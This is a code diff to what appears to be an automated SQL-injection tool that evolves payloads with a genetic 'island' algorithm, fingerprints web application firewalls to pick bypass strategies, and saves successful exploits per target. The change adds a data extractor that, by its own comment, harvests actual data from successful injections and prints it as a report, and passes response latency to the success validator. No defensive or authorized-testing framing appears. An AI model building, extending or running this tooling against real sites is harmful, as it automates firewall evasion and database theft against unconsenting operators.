@@ -7,6 +7,7 @@ from core.predictive_blocker import PredictiveBlocker
 from core.waf_fingerprinter import WAFFingerprinter
 from core.error_refiner import SQLErrorRefiner
 from utils.success_validator import SuccessValidator
+from utils.data_extractor import DataExtractor
 
 class IslandManager:
     def __init__(self, client, base_payloads, exp_manager, population_size=12, num_islands=3, context="GENERIC", disable_strings=True, baseline=None, target_name="default"):
@@ -18,6 +19,7 @@ class IslandManager:
         self.num_islands = num_islands
         self.island_pop_size = population_size // num_islands
         self.validator = SuccessValidator()
+        self.extractor = DataExtractor()
         self.best_score_history = []
         self.hall_of_fame = [] 
         self.discovered_niches = set()
@@ -258,7 +260,7 @@ class IslandManager:
                 print(f"  [Island {island['id']}] Request FAILED: {e}", flush=True)
                 continue
             
-            print(f"  [Island {island['id']}] Response received (Status: {response.status})", flush=True)
+            print(f"  [Island {island['id']}] Response received (Status: {response['status']})", flush=True)
             
             # 1.1 WAF Fingerprinting (First Request of the generation or if unknown)
             if i == 0:
@@ -268,7 +270,7 @@ class IslandManager:
                     strategy = self.fingerprinter.get_bypass_strategy(waf)
                     mutator.apply_hint({"suggestion": strategy["hint"], "weights": strategy["weights"]})
 
-            score, status = self.validator.validate(response['text'], response['status'], payload=payload_str, baseline=self.baseline)
+            score, status = self.validator.validate(response['text'], response['status'], payload=payload_str, latency=response.get('latency', 0), baseline=self.baseline)
             
             # 1.2 Combat Genetic Drift
             if status == "WAF_BYPASSED_PARTIAL" and any("WAF_BYPASSED_PARTIAL" in n for n in self.discovered_niches):
@@ -302,9 +304,16 @@ class IslandManager:
             # Track discoveries
             if score >= 0.3:
                 self.discovered_niches.add(f"{status}_{payload_str}")
-                if score >= 0.7 and payload_str not in self.hall_of_fame:
-                    self.hall_of_fame.append(payload_str)
-                    self.exp_manager.save_exploit(payload_str, status, target_name=self.target_name)
+                if score >= 0.7:
+                    # 4. Data Extraction Report (New: Harvesting actual data from success)
+                    harvested_data = self.extractor.extract(response['text'])
+                    if harvested_data:
+                        report = self.extractor.format_report(harvested_data)
+                        print(report, flush=True)
+
+                    if payload_str not in self.hall_of_fame:
+                        self.hall_of_fame.append(payload_str)
+                        self.exp_manager.save_exploit(payload_str, status, target_name=self.target_name)
 
         # Next Gen for this island
         scored_population.sort(key=lambda x: x[1], reverse=True)
